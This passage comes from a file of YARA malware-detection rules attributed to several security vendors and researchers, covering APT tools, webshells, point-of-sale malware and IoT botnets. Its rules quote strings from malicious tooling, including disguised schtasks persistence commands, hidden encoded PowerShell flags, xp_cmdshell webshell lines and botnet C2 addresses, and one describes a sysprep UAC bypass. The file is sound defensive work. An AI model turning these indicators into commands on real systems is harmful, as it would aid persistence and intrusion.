$s1 = "dnstunclient -d or -domain <domain>" fullword ascii
$s2 = "dnstunclient -ip <server ip address>" fullword ascii
$s3 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"\\Microsoft\\Windows\\PLA\\System\\Microsoft Windows\" /tr " fullword ascii
$s4 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"Microsoft Windows\" /tr " fullword ascii
$s5 = "taskkill /im conime.exe" fullword ascii
$s6 = "\\dns control\\t-DNSTunnel\\DnsTunClient\\DnsTunClient.cpp" fullword ascii
$s7 = "UDP error:can not bing the port(if there is unclosed the bind process?)" fullword ascii
$s8 = "use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)" fullword ascii
$s9 = "error: packet num error.the connection have condurt,pls try later" fullword ascii
$s10 = "Coversation produce one error:%s,coversation fail" fullword ascii
$s11 = "try to add many same pipe to select group(or mark is too easy)." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 2 of them ) or 5 of them
}
rule SSC_IronTiger_HTTP_SOCKS_Proxy_soexe
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Toolset - HTTP SOCKS Proxy soexe"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "listen SOCKET error." nocase wide ascii
$str2 = "WSAAsyncSelect SOCKET error." nocase wide ascii
$str3 = "new SOCKETINFO error!" nocase wide ascii
$str4 = "Http/1.1 403 Forbidden" nocase wide ascii
$str5 = "Create SOCKET error." nocase wide ascii
condition:
uint16(0) == 0x5a4d and (3 of ($str*))
}
rule SSC_IronPanda_Malware3
{
meta:
description = "Iron Panda Malware"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
hash = "5cd2af844e718570ae7ba9773a9075738c0b3b75c65909437c43201ce596a742"
strings:
$s0 = "PluginDeflater.exe" fullword wide
$s1 = ".Deflated" fullword wide
$s2 = "PluginDeflater" fullword ascii
$s3 = "DeflateStream" fullword ascii /* Goodware String - occured 1 times */
$s4 = "CompressionMode" fullword ascii /* Goodware String - occured 4 times */
$s5 = "System.IO.Compression" fullword ascii /* Goodware String - occured 6 times */
condition:
uint16(0) == 0x5a4d and filesize < 10KB and all of them
}
rule SSC_IronTiger_ASPXSpy
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "ASPXSpy detection. It might be used by other fraudsters"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "ASPXSpy" nocase wide ascii
$str2 = "IIS Spy" nocase wide ascii
$str3 = "protected void DGCoW(object sender,EventArgs e)" nocase wide ascii
condition:
any of ($str*)
}
rule SSC_IronPanda_Webshell_JSP
{
meta:
description = "Iron Panda Malware JSP"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
hash = "3be95477e1d9f3877b4355cff3fbcdd3589bb7f6349fd4ba6451e1e9d32b7fa6"
strings:
$s1 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
$s2 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
$s3 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
condition:
filesize < 330KB and 1 of them
}
rule SSC_IronTiger_GetUserInfo
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - GetUserInfo"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "getuserinfo username" nocase wide ascii
$str2 = "joe@joeware.net" nocase wide ascii
$str3 = "If . specified for userid," nocase wide ascii
condition:
uint16(0) == 0x5a4d and (any of ($str*))
}
rule SSC_IronPanda_Malware4
{
meta:
description = "Iron Panda Malware"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
hash = "0d6da946026154416f49df2283252d01ecfb0c41c27ef3bc79029483adc2240c"
strings:
$s0 = "TestPlugin.dll" fullword wide
$s1 = "<a href='http://www.baidu.com'>aasd</a>" fullword wide
$s2 = "Zcg.Test.AspxSpyPlugins" fullword ascii
$s6 = "TestPlugin" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 10KB and all of them
}
rule SSC_Scieron
{
meta:
author = "Symantec Security Response"
ref = "http://www.symantec.com/connect/tr/blogs/scarab-attackers-took-aim-select-russian-targets-2012"
date = "22.01.15"
strings:
// .text:10002069 66 83 F8 2C                       cmp     ax, ','
// .text:1000206D 74 0C                             jz      short loc_1000207B
// .text:1000206F 66 83 F8 3B                       cmp     ax, ';'
// .text:10002073 74 06                             jz      short loc_1000207B
// .text:10002075 66 83 F8 7C                       cmp     ax, '|'
// .text:10002079 75 05                             jnz     short loc_10002080
$code1 = {66 83 F? 2C 74 0C 66 83 F? 3B 74 06 66 83 F? 7C 75 05}
// .text:10001D83 83 F8 09                          cmp     eax, 9          ; switch 10 cases
// .text:10001D86 0F 87 DB 00 00 00                 ja      loc_10001E67    ; jumptable 10001D8C default case
// .text:10001D8C FF 24 85 55 1F 00+                jmp     ds:off_10001F55[eax*4] ; switch jump
$code2 = {83 F? 09 0F 87 ?? 0? 00 00 FF 24}
$str1  = "IP_PADDING_DATA" wide ascii
$str2  = "PORT_NUM" wide ascii
condition:
all of them
}
rule SSC_PoS_Malware_MalumPOS
{
meta:
author = "Trend Micro, Inc."
date = "2015-05-25"
description = "Used to detect MalumPOS memory dumper"
sample_filtype = "exe"
strings:
$string1 = "SOFTWARE\\Borland\\Delphi\\RTL"
$string2 = "B)[0-9]{13,19}\\"
$string3 = "[A-Za-z\\s]{0,30}\\/[A-Za-z\\s]{0,30}\\"
$string4 = "TRegExpr(exec): ExecNext Without Exec[Pos]"
$string5 = /Y:\\PROGRAMS\\.{20,300}\.pas/
condition:
all of ($string*)
}
rule SSC_BackoffROM
{
meta:
author = "Alienvault Labs"
reference = "http://blog.fortinet.com/post/rom-a-new-version-of-the-backoff-pos-malware"
strings:
$mz = {4d 5a}
$mutex = "aMD6qt7lWb1N3TNBSe4N"
$httpparam1 = "data=%s"
$httpparam2 = "oprat=%d"
$httpparam3 = "uid=%s"
$httpparam4 = "uinfo=%s"
$httpparam5 = "win=%d"
$httpparam6 = "grup=%s"
$httpparam7 = "vers=%s"
condition:
($mz at 0) and ($mutex or all of ($httpparam*))
}
rule SSC_BackoffROMHashes
{
meta:
author = "Alienvault Labs"
reference_hash = "35fb5c75a5b472eb2c6fd059ca136a9e,01dd913425f36e56e42fec6f96282a3d"
reference = "http://blog.fortinet.com/post/rom-a-new-version-of-the-backoff-pos-malware"
strings:
$mz = {4d 5a}
$func1 = {56 57 8B F9 33 F6 8B D6 85 FF ?? ?? 33 C0 ?? ?? 0F B7 0F 8B C6 66 85 C9 ?? ?? 66 83 F9 2E 0F 44 D0 40 0F B7 0C 47 66 85 C9 ?? ?? 85 D2 ?? ?? 8B D0 53 8B DE 85 D2 ?? ?? 8A 04 5F 0C 20 0F BE C8 03 F1 C1 E1 07 33 F1 43 3B DA}
$func2 = {7E 7C 00 00 73 37 00 00 68 07 00 00 0A 31 00 00 C6 0C 00 00 2E 35 00 00 02 31 00 00 1A 34 00 00 88 03 00 00 1B 4F 00 00 2C 27 00 00 FB 0E 00 00 25 01 00 00 ED 0C 00 00 64 03 00 00 26 3F 00 00 16 36 00 00 1B 0B 00 00 34 34 00 00 84 08 00 00 07 0A 00 00 9A 0B 00 00 FD 72 00 00 7D 3D 00 00 F1 07 00 00 85 3F 00 00 99 2B 00 00 24 3C 00 00 55 6C 7B 6F 2F 29 00 00 6E 75 79 68 6E 4A 6D 6B 75 54 67 44 00 00 00 00 66 4F 68 4A 63 41 51 6B 36 4F 00 00}
condition:
($mz at 0) and (any of ($func*))
}
rule SSC_penquinTurla1 : LinuxMalware
{
meta:
author = "Alienvault Labs"
reference = "https://securelist.com/blog/research/67962/the-penquin-turla-2/"
strings:
$elf = {7f 45}
$s1 = "/tmp/.xdfg"
$s2 = "Read or recive 0 status"
$s3 = "TREX_PID=%u"
condition:
$elf at 0 and all of ($s*)
}
rule SSC_Elknot_malware
{
meta:
author = "Novetta Advanced Research Group"
description = "Detection of the Elknot malware related to the Elasticsearch vulnerability attacks"
strings:
$ = "13CThreadAttack"
$ = "%7s %llu %lu %lu %lu %lu %lu %lu %lu %llu %lu %lu %lu %lu %lu %lu"
$ = "fake.cfg"
$ = "[ %02d.%02d %02d:%02d:%02d.%03ld ] [%lu] [%s] %s"
condition:
all of them
}
rule SSC_Elknot_dropper
{
meta:
author = "Novetta Advanced Research Group"
description = "Detection of the Elknot dropper related to the Elasticsearch vulnerability attacks after UPX is removed"
strings:
$ = { 2F 70 72 6F 63 2F 73 65 6C 66 2F 65 78 65 00 63
70 20 25 73 20 25 73 00 25 73 20 25 73 20 31 00
63 70 20 25 73 20 25 73 61 00 }
condition:
all of them
}
rule SSC_BillGates
{
meta:
author = "Novetta Advanced Research Group"
description = "Detection of the BillGates malware"
strings:
$ = "CThreadClientStatus"
$ = "CLoopCmd"
$ = "/tmp/gates.lock"
condition:
all of them
}
rule SSC_Linux_EternalMiner : LinuxMalware
{
meta:
reference = "06778ca06eb0be4a734a2908f3746764c148817707dbc32fad5f8dac6cc81e46,13a0ce618dcd0e17c7d8267174d07a997d39fcea10f8951ea7c0b5218ddcfe85"
author="jaime.blasco@alienvault.com"
strings:
$elf = {7f 45}
$dstr = "samba-root-shellcode.c"
$s1 = "samba_init_module"
$s2 = "change_to_root_user"
$s3 = "getpid"
$s4 = "payload"
condition:
$elf at 0 and ($dstr or all of ($s*))
}
rule SSC_GreenbugLsmPdbs {
meta:
reference = "https://otx.alienvault.com/pulse/58862b1d066f9d7608a08593/"
author = "jaime.blasco@alienvault.com"
strings:
$a = "Bot Fresh.pdb" wide ascii
$b = "\\Ism.pdb" wide ascii
$c = "\\Nrtscan.pdb" wide ascii
$d = "\\hhhb3.pdb" wide ascii
//$c1 = "Command executed successfully"
//$c2 = "message="
//$c3 = "filename="
//$c4 = "appId="
//$c5 = "DownloadFile"
condition:
uint16(0) == 0x5A4D and (($a) or ($b) or ($c) or ($d))
}
rule SSC_Rurktar
{
meta:
author = "Nathan Stern"
description = "Rurktar detection rule"
strings:
$a = "FriendlyID" wide ascii nocase
$a2 = "CaptureMode" wide ascii nocase
$a3 = "CaptureStart" wide ascii nocase
$a4 = "CaptureMonikerString" wide ascii nocase
$a5 = "ACaptureMonikerString" wide ascii nocase
$a6 = "VideoCap" wide ascii nocase
$a7 = "SkipFrames" wide ascii nocase
$a8 = "SkipDetectionFrames" wide ascii nocase
$a9 = "SkipTakeFrames" wide ascii nocase
$a10 = "DetectionPreBuffer" wide ascii nocase
$a11 = "MaxCaptureFrames" wide ascii nocase
$a12 = "MaxCaptureFolderSize" wide ascii nocase
$a13 = "NetworkImageQ" wide ascii nocase
$a14 = "CaptureDirectory" wide ascii nocase
$a15 = "DefPass" wide ascii nocase
$a16 = "CaptureStopProcess1" wide ascii nocase
$a17 = "CaptureStopProcess2" wide ascii nocase
$a18 = "DetectPorog" wide ascii nocase
$a19 = "WatchFiles" wide ascii nocase
$a20 = "AutoSendPreviews" wide ascii nocase
$a21 = "ControlExt" wide ascii nocase
$a22 = "SendOriginPreviews" wide ascii nocase
$a23 = "CopyOriginsToCaptureDir" wide ascii nocase
$a24 = "WatchProc" wide ascii nocase
$a25 = "ScreenshotExt" wide ascii nocase
$a26 = "ScreenshotAutoCapture" wide ascii nocase
$a27 = "ScreenshotAutoStartProcess" wide ascii nocase
$a28 = "ScreenshotPause" wide ascii nocase
$a29 = "ProxyEnabled" wide ascii nocase
$b = "\\R_C_S.ini" wide ascii nocase
$b2 = "\\RCS.ini" wide ascii nocase
$b3 = "RCS.log" wide ascii nocase
$b4 = "RCSU.exe" wide ascii nocase
$b5 = "RCS.log" wide ascii nocase
$c = "?share*" wide ascii nocase
$c2 = "?find*" wide ascii nocase
$c3 = "user?" wide ascii nocase
$c4 = "?prefs*" wide ascii nocase
$c5 = "?type*abstract" wide ascii nocase
$c6 = "?FriendlyID*" wide ascii nocase
$c7 = "?disc*" wide ascii nocase
condition:
5 of ($a*) or
3 of ($b*) or
4 of ($c*)
}
rule SSC_LuckyCatCode : LuckyCat Family
{
meta:
description = "LuckyCat code tricks"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$xordecrypt = { BF 0F 00 00 00 F7 F7 ?? ?? ?? ?? 32 14 39 80 F2 7B }
$dll = { C6 ?? ?? ?? 64 C6 ?? ?? ?? 6C C6 ?? ?? ?? 6C }
$commonletters = { B? 63 B? 61 B? 73 B? 65 }
condition:
$xordecrypt or ($dll and $commonletters)
}
rule SSC_LuaBot : MALW
{
meta:
description = "LuaBot"
author = "Joan Soriano / @joanbtl"
date = "2017-06-07"
version = "1.0"
MD5 = "9df3372f058874fa964548cbb74c74bf"
SHA1 = "89226865501ee7d399354656d870b4a9c02db1d3"
ref1 = "http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html"
strings:
$a = "LUA_PATH"
$b = "Hi. Happy reversing, you can mail me: luabot@yandex.ru"
$c = "/tmp/lua_XXXXXX"
$d = "NOTIFY"
$e = "UPDATE"
condition:
all of them
}
rule SSC_GEN_PowerShell
{
meta:
description = "Generic PowerShell Malware Rule"
author = "https://github.com/interleaved"
strings:
$s1 = "powershell"
$s2 = "-ep bypass" nocase
$s3 = "-nop" nocase
$s10 = "-executionpolicy bypass" nocase
$s4 = "-win hidden" nocase
$s5 = "-windowstyle hidden" nocase
$s11 = "-w hidden" nocase
/*$s6 = "-noni" fullword ascii*/
/*$s7 = "-noninteractive" fullword ascii*/
$s8 = "-enc" nocase
$s9 = "-encodedcommand" nocase
condition:
$s1 and (($s2 or $s3 or $s10) and ($s4 or $s5 or $s11) and ($s8 or $s9))
}
rule SSC_Kovter
{
meta:
maltype = "Kovter"
reference = "http://blog.airbuscybersecurity.com/post/2016/03/FILELESS-MALWARE-%E2%80%93-A-BEHAVIOURAL-ANALYSIS-OF-KOVTER-PERSISTENCE"
date = "9-19-2016"
description = "fileless malware"
strings:
$type="Microsoft-Windows-Security-Auditing" wide ascii
$eventid="4688" wide ascii
$data="Windows\\System32\\regsvr32.exe" wide ascii
$type1="Microsoft-Windows-Security-Auditing" wide ascii
$eventid1="4689" wide ascii
$data1="Windows\\System32\\mshta.exe" wide ascii
$type2="Microsoft-Windows-Security-Auditing" wide ascii
$eventid2="4689" wide ascii
$data2="Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" wide ascii
$type3="Microsoft-Windows-Security-Auditing" wide ascii
$eventid3="4689" wide ascii
$data3="Windows\\System32\\wbem\\WmiPrvSE.exe" wide ascii
condition:
all of them
}
rule SSC_Korplug
{
meta:
maltype = "Korplug Backdoor"
author = "https://github.com/reed1713"
reference = "http://www.symantec.com/connect/blogs/new-sample-backdoorkorplug-signed-stolen-certificate"
description = "IOC looks for events associated with the KORPLUG Backdoor linked to the recent operation greedy wonk activity."
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="4688"
$data="ProgramData\\RasTls\\RasTls.exe"
$type1="Microsoft-Windows-Security-Auditing"
$eventid1="4688"
$data1="ProgramData\\RasTls\\rundll32.exe"
$type2="Microsoft-Windows-Security-Auditing"
$eventid2="4688"
$data2="ProgramData\\RasTls\\svchost.exe"
condition:
all of them
}
rule SSC_Korplug_FAST {
meta:
description = "Rule to detect Korplug/PlugX FAST variant"
author = "Florian Roth"
date = "2015-08-20"
hash = "c437465db42268332543fbf6fd6a560ca010f19e0fd56562fb83fb704824b371"
strings:
$x1 = "%s\\rundll32.exe \"%s\", ShadowPlay" fullword ascii
$a1 = "ShadowPlay" fullword ascii
$s1 = "%s\\rundll32.exe \"%s\"," fullword ascii
$s2 = "nvdisps.dll" fullword ascii
$s3 = "%snvdisps.dll" fullword ascii
$s4 = "\\winhlp32.exe" fullword ascii
$s5 = "nvdisps_user.dat" fullword ascii
$s6 = "%snvdisps_user.dat" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 500KB and
(
$x1 or
($a1 and 1 of ($s*)) or
4 of ($s*)
)
}
rule SSC_APT_Win_Pipcreat
{
meta:
author = "chort (@chort0)"
description = "APT backdoor Pipcreat"
filetype = "pe,dll"
date = "2013-03"
MD5 = "f09d832bea93cf320986b53fce4b8397" // (incorrectly?) identified as Hupigon by many AV on VT
Reference = "http://www.cyberengineeringservices.com/login-exe-analysis-trojan-pipcreat/"
version = "1.0"
strings:
$strA = "pip creat failed" wide fullword
$strB = "CraatePipe" ascii fullword
$strC = "are you there? " wide fullword
$strD = "success kill process ok" wide fullword
$strE = "Vista|08|Win7" wide fullword
$rut = "are you there!@#$%^&*()_+" ascii fullword
condition:
$rut or (2 of ($str*))
}
rule SSC_korlia
{
meta:
author = "Nick Hoffman"
company = "Morphick"
reference = "http://www.morphick.com/resources/lab-blog/curious-korlia"
information = "korlia malware found in apt dump"
//case a
//b2 1f mov dl, 0x1f ; mov key (wildcard)
// -----------------
//8A 86 98 40 00 71 mov al, byte ptr url[esi]
//BF 98 40 00 71 mov edi, offset url
//32 C2 xor al, dl
//83 C9 FF or ecx, 0FFFFFFFFh
//88 86 98 40 00 71 mov byte ptr url[esi], al
//33 C0 xor eax, eax
//46 inc esi
//F2 AE repne scasb
//F7 D1 not ecx
//49 dec ecx
//3B F1 cmp esi, ecx
//72 DE jb short loc_71001DE0
//case b (variant of loop a)
//8A 8A 28 50 40 00 mov cl, byte_405028[edx]
//BF 28 50 40 00 mov edi, offset byte_405028
//32 CB xor cl, bl
//33 C0 xor eax, eax
//88 8A 28 50 40 00 mov byte_405028[edx], cl
//83 C9 FF or ecx, 0FFFFFFFFh
//42 inc edx
//F2 AE repne scasb
//F7 D1 not ecx
//49 dec ecx
//3B D1 cmp edx, ecx
//72 DE jb short loc_4047F2
//case c (not a variant of the above loop)
//8A 0C 28 mov cl, [eax+ebp]
//80 F1 28 xor cl, 28h
//88 0C 28 mov [eax+ebp], cl
//8B 4C 24 14 mov ecx, [esp+0D78h+var_D64]
//40 inc eax
//3B C1 cmp eax, ecx
//7C EE jl short loc_404F1C
strings:
$a = {b2 ?? 8A 86 98 40 00 71 BF 98 40 00 71 32 c2 83 C9 FF 88 86 98 40 00 71 33 C0 46 F2 AE F7 D1 49 3B F1}
$b = {B3 ?? ?? ?? 8A 8A 28 50 40 00 BF 28 50 40 00 32 CB 33 C0 88 8A 28 50 40 00 83 C9 FF 42 F2 AE F7 D1 49 3B D1}
$c = {8A 0C 28 80 F1 ?? 88 0C 28 8B 4C 24 14 40 3B C1}
$d = {00 62 69 73 6F 6E 61 6C 00} //config marker "\x00bisonal\x00"
condition:
any of them
}
rule SSC_KelihosHlux
{
meta:
author = "@malpush"
maltype = "KelihosHlux"
description = "http://malwared.ru"
date = "22/02/2014"
strings:
$KelihosHlux_HexString = { 73 20 7D 8B FE 95 E4 12 4F 3F 99 3F 6E C8 28 26 C2 41 D9 8F C1 6A 72 A6 CE 36 0F 73 DD 2A 72 B0 CC D1 07 8B 2B 98 73 0E 7E 8C 07 DC 6C 71 63 F4 23 27 DD 17 56 AE AB 1E 30 52 E7 54 51 F7 20 ED C7 2D 4B 72 E0 77 8E B4 D2 A8 0D 8D 6A 64 F9 B7 7B 08 70 8D EF F3 9A 77 F6 0D 88 3A 8F BB C8 89 F5 F8 39 36 BA 0E CB 38 40 BF 39 73 F4 01 DC C1 17 BF C1 76 F6 84 8F BD 87 76 BC 7F 85 41 81 BD C6 3F BC 39 BD C0 89 47 3E 92 BD 80 60 9D 89 15 6A C6 B9 89 37 C4 FF 00 3D 45 38 09 CD 29 00 90 BB B6 38 FD 28 9C 01 39 0E F9 30 A9 66 6B 19 C9 F8 4C 3E B1 C7 CB 1B C9 3A 87 3E 8E 74 E7 71 D1 }
condition:
$KelihosHlux_HexString
}
rule SSC_Backdoor_Jolob
{
meta:
maltype = "Backdoor.Jolob"
ref = "https://github.com/reed1713"
reference = "http://www.symantec.com/connect/blogs/new-flash-zero-day-linked-yet-more-watering-hole-attacks"
description = "the backdoor registers an auto start service with the display name \"Network Access Management Agent\" pointing to the dll netfilter.dll. This is accomplished without notifying the user via the sysprep UAC bypass method."
strings:
$type = "Microsoft-Windows-Security-Auditing"
$eventid = "4673"
$data1 = "Security"
$data2 = "SeCreateGlobalPrivilege"
$data3 = "Windows\\System32\\sysprep\\sysprep.exe" nocase
$type1 = "Microsoft-Windows-Security-Auditing"
$eventid1 = "4688"
$data4 = "Windows\\System32\\sysprep\\sysprep.exe" nocase
$type2 = "Service Control Manager"
$eventid2 = "7036"
$data5 = "Network Access Management Agent"
$data6 = "running"
$type3 = "Service Control Manager"
$eventid3 = "7045"
$data7 = "Network Access Management Agent"
$data8 = "user mode service"
$data9 = "auto start"
condition:
all of them
}
rule SSC_Insta11Strings : Insta11 Family
{
meta:
description = "Insta11 Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-23"
strings:
$ = "XTALKER7"
$ = "Insta11 Microsoft" wide ascii
$ = "wudMessage"
$ = "ECD4FC4D-521C-11D0-B792-00A0C90312E1"
$ = "B12AE898-D056-4378-A844-6D393FE37956"
condition:
any of them
}
rule SSC_iexpl0reStrings : iexpl0re Family
{
meta:
description = "Strings used by iexpl0re"
author = "Seth Hardy"
last_modified = "2014-07-21"
strings:
$ = "%USERPROFILE%\\IEXPL0RE.EXE"
$ = "\"<770j (("
$ = "\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IEXPL0RE.LNK"
$ = "\\Documents and Settings\\%s\\Application Data\\Microsoft\\Internet Explorer\\IEXPL0RE.EXE"
$ = "LoaderV5.dll"
// stage 2
$ = "POST /index%0.9d.asp HTTP/1.1"
$ = "GET /search?n=%0.9d&"
$ = "DUDE_AM_I_SHARP-3.14159265358979x6.626176"
$ = "WHO_A_R_E_YOU?2.99792458x1.25663706143592"
$ = "BASTARD_&&_BITCHES_%0.8x"
$ = "c:\\bbb\\eee.txt"
condition:
any of them
}
rule SSC_Hsdfihdf: banking malware
{
meta:
author = "Adam Ziaja <adam@adamziaja.com> http://adamziaja.com"
date = "2014-04-06"
description = "Polish banking malware"
hash0 = "db1675c74a444fd35383d9a45631cada"
hash1 = "f48ba39df38056449a3e9a1a7289f657"
filetype = "exe"
strings:
$s0 = "ANSI_CHARSET"
$s1 = "][Vee_d_["
$s2 = "qfcD:6<"
$s3 = "%-%/%1%3%5%7%9%;%"
$s4 = "imhzxsc\\WWKD<.)w"
$s5 = "Vzlarf\\]VOZVMskf"
$s6 = "JKWFAp\\Z"
$s7 = "<aLLwhg"
$s8 = "bdLeftToRight"
$s9 = "F/.pTC7"
$s10 = "O><8,)-$ "
$s11 = "mjeUB>D.'8)5\\\\vhe["
$s12 = "JGiVRk[W]PL("
$s13 = "zwWNNG:8"
$s14 = "zv7,'$"
$a0 = "#hsdfihdf"
$a1 = "polska.irc.pl"
$b0 = "firehim@o2.pl"
$b1 = "firehim@go2.pl"
$b2 = "firehim@tlen.pl"
$c0 = "cyberpunks.pl"
$c1 = "kaper.phrack.pl"
$c2 = "serwer.uk.to"
$c3 = "ns1.ipv4.hu"
$c4 = "scorebot.koth.hu"
$c5 = "esopoland.pl"
condition:
14 of ($s*) or all of ($a*) or 1 of ($b*) or 2 of ($c*)
}
rule SSC_Hajime_generic_ARCH : MALW
{
meta:
description = "Hajime Botnet - generic arch"
author = "Joan Soriano / @joanbtl"
date = "2017-05-01"
version = "1.0"
MD5 = "77122e0e6fcf18df9572d80c4eedd88d"
SHA1 = "108ee460d4c11ea373b7bba92086dd8023c0654f"
ref1 = "https://www.symantec.com/connect/blogs/hajime-worm-battles-mirai-control-internet-things/"
ref2 = "https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf"
strings:
$userpass = "%d (!=0),user/pass auth will not work, ignored.\n"
$etcTZ = "/etc/TZ"
$Mvrs = ",M4.1.0,M10.5.0"
$bld = "%u.%u.%u.%u.in-addr.arpa"
condition:
$userpass and $etcTZ and $Mvrs and $bld
}
rule SSC_Grozlex : Stealer
{
meta:
author="Kevin Falcoz"
date="20/08/2013"
description="Grozlex Stealer - Possible HCStealer"
strings:
$signature={4C 00 6F 00 67 00 73 00 20 00 61 00 74 00 74 00 61 00 63 00 68 00 65 00 64 00 20 00 62 00 79 00 20 00 69 00 43 00 6F 00 7A 00 65 00 6E}
condition:
$signature
}
rule SSC_GoziRule : Gozi Family {
meta:
description = "Win32.Gozi"
author = "CCN-CERT"
version = "1.0"
ref = "https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html"
strings:
$ = {63 00 6F 00 6F 00 6B 00 69 00 65 00 73 00 2E 00 73 00 71 00 6C 00 69 00 74 00 65 00 2D 00 6A 00 6F 00 75 00 72 00 6E 00 61 00 6C 00 00 00 4F 50 45 52 41 2E 45 58 45 00}
condition:
all of them
}
rule SSC_genome {
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-09-07"
description = "Identify Genome"
strings:
$s1 = "Attempting to create more than one keyboard::Monitor instance"
$s2 = "{Right windows}"
$s3 = "Access violation - no RTTI data!"
condition:
all of them
}
rule SSC_Gafgyt_Botnet_generic : MALW
{
meta:
description = "Gafgyt Trojan"
author = "Joan Soriano / @joanbtl"
date = "2017-05-01"
version = "1.0"
MD5 = "e3fac853203c3f1692af0101eaad87f1"
SHA1 = "710781e62d49419a3a73624f4a914b2ad1684c6a"
strings:
$etcTZ = "/bin/busybox;echo -e 'gayfgt'"
$s2 = "/proc/net/route"
$s3 = "admin"
$s4 = "root"
condition:
$etcTZ and $s2 and $s3 and $s4
}
rule SSC_Gafgyt_Botnet_oh : MALW
{
meta:
description = "Gafgyt Trojan"
author = "Joan Soriano / @joanbtl"
date = "2017-05-025"
version = "1.0"
MD5 = "97f5edac312de349495cb4afd119d2a5"
SHA1 = "916a51f2139f11e8be6247418dca6c41591f4557"
strings:
$s1 = "busyboxterrorist"
$s2 = "BOGOMIPS"
$s3 = "124.105.97.%d"
$s4 = "fucknet"
condition:
$s1 and $s2 and $s3 and $s4
}
rule SSC_Gafgyt_Botnet_jackmy : MALW
{
meta:
description = "Gafgyt Trojan"
author = "Joan Soriano / @joanbtl"
date = "2017-05-25"
version = "1.0"
MD5 = "419b8a10a3ac200e7e8a0c141b8abfba"
SHA1 = "5433a5768c5d22dabc4d133c8a1d192d525939d5"
strings:
$s1 = "PING"
$s2 = "PONG"
$s3 = "jackmy"
$s4 = "203.134.%d.%d"
condition:
$s1 and $s2 and $s3 and $s4
}
rule SSC_Gafgyt_Botnet_hoho : MALW
{
meta:
description = "Gafgyt Trojan"
author = "Joan Soriano / @joanbtl"
date = "2017-05-25"
version = "1.0"
MD5 = "369c7c66224b343f624803d595aa1e09"
SHA1 = "54519d2c124cb536ed0ddad5683440293d90934f"
strings:
$s1 = "PING"
$s2 = "PRIVMSG"
$s3 = "Remote IRC Bot"
$s4 = "23.95.43.182"
condition:
$s1 and $s2 and $s3 and $s4
}
rule SSC_Gafgyt_Botnet_HIHI: MALW
{
meta:
description = "Gafgyt Trojan"
author = "Joan Soriano / @joanbtl"
date = "2017-05-01"
version = "1.0"
MD5 = "cc99e8dd2067fd5702a4716164865c8a"
SHA1 = "b9b316c1cc9f7a1bf8c70400861de08d95716e49"
strings:
$s1 = "PING"
$s2 = "PONG"
$s3 = "TELNET LOGIN CRACKED - %s:%s:%s"
$s4 = "ADVANCEDBOT"
$s5 = "46.166.185.92"
$s6 = "LOLNOGTFO"
condition:
$s1 and $s2 and $s3 and $s4 and $s5 and $s6
}
rule SSC_Gafgyt_Botnet_bash : MALW
{
meta:
description = "Gafgyt Trojan"
author = "Joan Soriano / @joanbtl"
date = "2017-05-25"
version = "1.0"
MD5 = "c8d58acfe524a09d4df7ffbe4a43c429"
SHA1 = "b41fefa8470f3b3657594af18d2ea4f6ac4d567f"
strings:
$s1 = "PONG!"
$s2 = "GETLOCALIP"
$s3 = "HTTPFLOOD"
$s4 = "LUCKYLILDUDE"
condition:
$s1 and $s2 and $s3 and $s4
}
rule SSC_APT_Malware_PutterPanda_Rel
{
meta:
description = "Detects an APT malware related to PutterPanda"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
hash = "5367e183df155e3133d916f7080ef973f7741d34"
strings:
$x0 = "app.stream-media.net" fullword ascii /* score: '12.03' */
$x1 = "File %s does'nt exist or is forbidden to acess!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.035' */
$s6 = "GetProcessAddresss of pHttpQueryInfoA Failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.02' */
$s7 = "Connect %s error!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.04' */
$s9 = "Download file %s successfully!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.03' */
$s10 = "index.tmp" fullword ascii /* score: '14.03' */
$s11 = "Execute PE Successfully" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.03' */
$s13 = "aa/22/success.xml" fullword ascii /* score: '12.005' */
$s16 = "aa/22/index.asp" fullword ascii /* score: '11.02' */
$s18 = "File %s a Non-Pe File" fullword ascii /* score: '8.04' */
$s19 = "SendRequset error!" fullword ascii /* score: '8.04' */
$s20 = "filelist[%d]=%s" fullword ascii /* score: '7.015' */
condition:
( uint16(0) == 0x5a4d and 1 of ($x*) ) or ( 4 of ($s*) )
}
rule SSC_APT_Malware_PutterPanda_MsUpdater_2
{
meta:
description = "Detects Malware related to PutterPanda - MSUpdater"
author = "Florian Roth"
score = 70
